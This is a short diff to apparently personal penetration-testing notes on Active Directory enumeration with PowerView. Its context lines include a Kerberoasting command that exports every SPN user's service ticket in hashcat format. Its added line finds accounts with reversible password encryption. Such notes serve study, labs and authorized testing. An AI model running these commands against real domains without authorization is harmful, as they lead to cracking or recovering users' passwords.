@@ -67,6 +67,11 @@ Test-AdminAccess -ComputerName <computername>
 3. Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
 # Request all users and export tickets to a file in hashcat format
 
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
+# Find users that have reversable encryption enabled
+```
+
+
 ```
 
 # Access Control Lists
